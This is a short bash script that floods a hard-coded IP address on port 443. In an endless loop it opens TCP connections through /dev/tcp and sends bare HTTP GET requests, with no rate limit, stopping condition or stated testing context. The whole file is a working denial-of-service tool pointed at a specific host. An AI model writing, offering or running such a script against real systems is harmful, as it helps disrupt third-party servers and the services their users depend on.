#!/bin/bash

target_ip="45.33.15.206"
target_port="443"

while true
do
  # Open a TCP connection to the target IP and port
  exec 3<>/dev/tcp/$target_ip/$target_port
  
  # Send a GET request to the target
  echo -e "GET / HTTP/1.1\r\nHost: $target_ip\r\n\r\n" >&3
  
  # Close the connection
  exec 3<&-
  exec 3>&-
done